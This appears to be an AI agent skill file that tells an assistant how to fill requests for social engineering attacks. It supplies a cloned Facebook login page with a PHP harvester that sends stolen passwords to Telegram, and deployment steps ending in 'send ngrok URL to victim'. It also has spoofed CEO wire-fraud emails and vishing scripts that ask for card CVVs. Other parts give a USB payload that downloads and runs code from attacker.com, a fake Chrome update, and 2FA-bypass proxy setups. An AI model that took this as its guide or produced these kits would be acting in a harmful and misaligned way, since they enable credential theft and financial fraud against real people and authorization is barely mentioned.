---
name: social-engineering
description: Phishing, pretexting, vishing, credential harvesting.
tags: [phishing, social-engineering, pretexting, vishing, gophish, set]
---

# Social Engineering

Use when user requests social engineering attacks: phishing pages, credential harvesting, pretexting scenarios, vishing scripts, or psychological manipulation techniques.

## Trigger Conditions
- Phishing page creation
- Credential harvesting
- Email phishing campaigns
- Pretexting scenarios
- Vishing (voice phishing) scripts
- Physical social engineering
- Spear phishing

## Phishing Page Creation

### Social Engineering Toolkit (SET)
```bash
# Install SET
apt install set

# Run SET
setoolkit

# Menu navigation:
# 1) Social-Engineering Attacks
# 2) Website Attack Vectors
# 3) Credential Harvester Attack Method
# 2) Site Cloner

# Enter target URL (e.g., facebook.com, gmail.com)
# Enter your IP address for hosting

# Captures credentials to:
# /var/www/html/harvester_*.txt
```

### Manual Phishing Page (HTML)
```html
<!DOCTYPE html>
<html>
<head>
    <title>Facebook - Log In or Sign Up</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 400px;
            margin: 100px auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1);
        }
        .logo {
            color: #1877f2;
            font-size: 48px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 20px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            margin: 6px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            background: #1877f2;
            color: white;
            padding: 14px 16px;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover {
            background: #166fe5;
        }
        .error {
            color: red;
            text-align: center;
            margin: 10px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <div class="error" id="error">Wrong credentials. Please try again.</div>
        <form action="harvest.php" method="POST">
            <input type="text" name="email" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
```

### Credential Harvester Backend (PHP)
```php
<?php
// harvest.php

// Get credentials
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

// Log to file
$log = fopen('credentials.txt', 'a');
fwrite($log, "[$timestamp] IP: $ip | Email: $email | Password: $password\n");
fclose($log);

// Send to Telegram
$bot_token = "YOUR_BOT_TOKEN";
$chat_id = "YOUR_CHAT_ID";
$message = "🎣 NEW PHISH\n\n📧 Email: $email\n🔑 Password: $password\n🌐 IP: $ip\n⏰ Time: $timestamp";

file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

// Redirect to real site (avoid suspicion)
header('Location: https://www.facebook.com/login/');
exit();
?>
```

### Deploy Phishing Site
```bash
# Setup web server
apt install apache2 php

# Copy files
cp phishing.html /var/www/html/index.html
cp harvest.php /var/www/html/

# Set permissions
chmod 777 /var/www/html/credentials.txt

# Start server
service apache2 start

# Get public URL (Ngrok for demo)
ngrok http 80

# Send ngrok URL to victim
```

## Gophish (Advanced Phishing Framework)

### Setup Gophish
```bash
# Download
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish

# Run
chmod +x gophish
./gophish

# Access web interface: https://localhost:3333
# Default: admin / gophish
```

### Create Campaign
```
1. Users & Groups
   - Import email list CSV
   - Columns: First Name, Last Name, Email, Position

2. Email Templates
   - Subject: "Urgent: Password Reset Required"
   - Body: HTML with {{.URL}} placeholder
   - Example: "Click here to reset: {{.URL}}"

3. Landing Pages
   - Clone target site or upload HTML
   - Capture credentials with form
   - Redirect after submission

4. Sending Profiles
   - SMTP server settings
   - Use compromised/throwaway SMTP

5. Launch Campaign
   - Select all components
   - Set launch time
   - Monitor dashboard for results
```

### Gophish Email Template Example
```html
<!DOCTYPE html>
<html>
<body>
    <p>Dear {{.FirstName}},</p>
    
    <p>We detected suspicious activity on your account. For security reasons, 
    you must verify your identity within 24 hours or your account will be suspended.</p>
    
    <p><a href="{{.URL}}" style="background: #1877f2; color: white; padding: 10px 20px; 
    text-decoration: none; border-radius: 5px;">Verify Now</a></p>
    
    <p>This link expires in 24 hours.</p>
    
    <p>Thanks,<br>Security Team</p>
    
    <p style="font-size: 10px; color: #999;">
    If you didn't request this, please ignore this email.
    </p>
</body>
</html>
```

## Email Spoofing

### SMTP Spoofing Script (Python)
```python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def send_spoofed_email(smtp_server, smtp_port, from_email, to_email, subject, body):
    msg = MIMEMultipart()
    msg['From'] = from_email  # Spoofed sender
    msg['To'] = to_email
    msg['Subject'] = subject
    
    msg.attach(MIMEText(body, 'html'))
    
    try:
        # Use open relay or compromised SMTP
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        print(f"[+] Email sent to {to_email}")
    except Exception as e:
        print(f"[-] Failed: {e}")

# Usage
send_spoofed_email(
    smtp_server="mail.example.com",
    smtp_port=587,
    from_email="ceo@targetcompany.com",  # Spoofed
    to_email="victim@targetcompany.com",
    subject="Urgent: Wire Transfer Needed",
    body="<p>Please process this wire transfer immediately...</p>"
)
```

### SPF/DKIM Bypass
```bash
# Find domains without SPF/DKIM
dig targetdomain.com TXT | grep -i spf
dig _dmarc.targetdomain.com TXT

# If no SPF record, direct spoofing works
# If SPF exists, find related/partner domains without SPF

# Subdomain enumeration
subfinder -d targetdomain.com | while read sub; do
    if ! dig $sub TXT | grep -q spf; then
        echo "No SPF: $sub"
    fi
done
```

## Pretexting Scenarios

### IT Help Desk Pretext
```
Phone Script:

"Hi, this is John from IT Support. We're performing 
a mandatory security update on all employee accounts. 
I need to verify your credentials to apply the patch.

Can you confirm your:
- Email address
- Current password (I'll verify it's correct)
- Last 4 digits of employee ID

This will only take a minute and prevents your 
account from being locked out tomorrow."
```

### Vendor/Partner Pretext
```
Email Template:

Subject: Invoice #4821 - Payment Overdue

Dear [Name],

Our records show Invoice #4821 for $12,450 is now 
45 days overdue. To avoid service interruption, 
please process payment immediately.

Invoice details: [MALICIOUS LINK]

If payment was already sent, please forward proof 
to accounts@vendor-company.com

Best regards,
Sarah Johnson
Accounts Receivable
ABC Vendor Corp
```

### Executive/CEO Pretext (Whaling)
```
Subject: Urgent - Confidential Acquisition

[Employee Name],

I'm in meetings all day but need you to handle 
something confidential. We're acquiring a competitor 
and I need you to process a wire transfer before EOD.

Amount: $85,000
Account: [Attacker's account]

Keep this completely confidential until the 
announcement next week.

- [CEO Name]
Sent from my iPhone
```

## Vishing (Voice Phishing)

### Bank Security Vishing
```
Script:

"Hello, this is Michael from [Bank Name] Fraud Department.
We detected suspicious activity on your account ending in [last 4 digits].

Did you authorize a $2,500 transaction to [suspicious location]?

[Victim says no]

Okay, I'm flagging this as fraud. To secure your account, 
I need to verify your identity:

- Full card number (to confirm it's your account)
- CVV (security code on back)
- Online banking password (to reset it)

I'm putting a temporary hold on your card right now 
for your protection."
```

### Voice Deepfake (Advanced)
```bash
# Install voice cloning tool
git clone https://github.com/CorentinJ/Real-Time-Voice-Cloning
cd Real-Time-Voice-Cloning
pip install -r requirements.txt

# Record target voice (from YouTube, meetings, etc.)
# Minimum 30 seconds of clean audio

# Generate fake audio
python demo_cli.py

# Use in vishing call (play audio during call)
```

## Physical Social Engineering

### Tailgating
```
Technique: Follow employee through secure door

Props needed:
- Branded company shirt/uniform
- Laptop bag
- Fake ID badge (print from photos)
- Coffee cup / phone (hands full)

Script:
"Thanks! My badge isn't working again, IT said 
they'd fix it yesterday..."
```

### Baiting (USB Drop)
```bash
# Create malicious USB payload
# 1. HID payload (Rubber Ducky script)
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -c "iex(iwr http://attacker.com/payload.ps1)"
ENTER

# 2. Autorun payload (if Windows autorun enabled)
# Create autorun.inf
[autorun]
open=payload.exe
icon=Documents.ico
label=Q4 Reports

# 3. Office macro payload
# Create Excel file with macro
# Name: "2024_Salary_Increases.xlsx"

# Drop USBs in:
- Parking lot
- Elevator
- Reception desk
- Break room
```

## Browser-Based Attacks

### Fake Browser Update
```html
<!-- Fake Chrome update page -->
<!DOCTYPE html>
<html>
<head>
    <title>Chrome Update Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            text-align: center;
            padding: 100px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 8px;
            max-width: 500px;
            margin: 0 auto;
        }
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
        }
        button {
            background: #4285f4;
            color: white;
            padding: 15px 40px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🌐</div>
        <h2>Update Required</h2>
        <p>Your browser is out of date. Install the latest security update to continue.</p>
        <button onclick="window.location='http://attacker.com/ChromeSetup.exe'">
            Update Chrome
        </button>
    </div>
</body>
</html>
```

## QR Code Phishing

### Generate Malicious QR Code
```python
import qrcode

# Create QR pointing to phishing site
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data('https://paypa1.com/verify')  # Note: paypal with "1" not "l"
qr.make(fit=True)

img = qr.make_image(fill_color="black", back_color="white")
img.save('payment_qr.png')

# Print QR codes and place in public:
# - "Scan to connect to WiFi"
# - "Scan for menu"
# - "Scan to pay parking"
```

## Credential Harvesting Tools

### Evilginx2 (MitM Phishing)
```bash
# Install
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make

# Run
./evilginx2 -p phishlets/

# Configure
config domain attacker.com
config ip 1.2.3.4

# Setup phishlet (e.g., Office 365)
phishlets hostname o365 login.attacker.com
phishlets enable o365

# Create lure
lures create o365
lures get-url 0

# Captures session tokens, bypasses 2FA!
```

### Modlishka (Reverse Proxy Phishing)
```bash
# Install
go get -u github.com/drk1wi/Modlishka
cd ~/go/src/github.com/drk1wi/Modlishka
make

# Config
cat > config.json <<EOF
{
  "proxyDomain": "login-microsoft.attacker.com",
  "listeningAddress": "0.0.0.0",
  "target": "login.microsoftonline.com",
  "targetResources": "login.live.com",
  "jsRules": "target.js",
  "terminateTriggers": "logout",
  "trackingCookie": "track",
  "trackingParam": "id"
}
EOF

# Run
./Modlishka -config config.json
```

## Psychological Techniques

### Urgency
- "Your account will be locked in 24 hours"
- "Immediate action required"
- "Limited time offer expires today"

### Authority
- Impersonate CEO, IT admin, law enforcement
- Use official-looking emails/documents
- Professional language and formatting

### Trust
- Reference real projects/people at company
- Use internal jargon
- Mention recent company events

### Fear
- "Security breach detected"
- "Suspicious activity on your account"
- "Legal action pending"

### Reciprocity
- Free gift/trial requires "verification"
- Survey with prize needs "account confirmation"

## Reconnaissance for Spear Phishing

### LinkedIn Scraping
```python
import requests
from bs4 import BeautifulSoup

def scrape_linkedin_employees(company_name):
    # Use LinkedIn search
    url = f"https://www.linkedin.com/search/results/people/?keywords={company_name}"
    
    # Requires authenticated session
    cookies = {"li_at": "YOUR_LINKEDIN_SESSION_COOKIE"}
    
    response = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    employees = []
    for result in soup.find_all('div', class_='entity-result'):
        name = result.find('span', class_='entity-result__title').text
        title = result.find('div', class_='entity-result__primary-subtitle').text
        employees.append({'name': name, 'title': title})
    
    return employees

# Generate email list
employees = scrape_linkedin_employees("Target Corp")
for emp in employees:
    # Common email patterns
    first, last = emp['name'].lower().split()
    emails = [
        f"{first}.{last}@targetcorp.com",
        f"{first}@targetcorp.com",
        f"{first[0]}{last}@targetcorp.com"
    ]
    print(f"{emp['name']} ({emp['title']}): {emails}")
```

### Email Validation
```bash
# Verify email exists
# Method 1: SMTP check
telnet mail.targetcorp.com 25
HELO attacker.com
MAIL FROM: test@attacker.com
RCPT TO: john.doe@targetcorp.com
# If "250 OK" = email exists

# Method 2: Hunter.io API
curl "https://api.hunter.io/v2/email-verifier?email=john.doe@targetcorp.com&api_key=YOUR_KEY"

# Method 3: theHarvester
theHarvester -d targetcorp.com -b all
```

## Defense Evasion

### Link Obfuscation
```
Original: https://attacker.com/phish

Obfuscated:
1. URL shortener: bit.ly/xyz123
2. Open redirect: google.com/url?q=https://attacker.com
3. Unicode homograph: https://micr0soft.com (0 instead of o)
4. HTML encoding: https://attacker.com/ph%69sh
5. Link in image: <img src="x" onerror="location='https://attacker.com'">
```

### Domain Variations
```
Original: microsoft.com

Typosquatting:
- micros0ft.com (0 instead of o)
- microsoft-login.com
- microsoft.support.com
- microsoftonline-verify.com
- rnicrosoft.com (rn looks like m)
```

## Pitfalls
- **Email security**: SPF/DKIM/DMARC prevent spoofing
- **2FA**: Phishing pages can't bypass hardware tokens
- **Detection**: Security awareness training teaches users to spot phishing
- **Legal**: Illegal without written authorization
- **Link scanning**: Some email providers scan/block malicious links

## Metrics for Success
- Click rate (% who click link)
- Submission rate (% who enter credentials)
- Time to first click
- Time to submission
- Email open rate

## Related Skills
- `wireless-hacking`: Evil twin phishing portals
- `web-pentesting-tools`: Host phishing sites with CloudFlare bypass
- `malware-development`: Payload delivery after phishing success
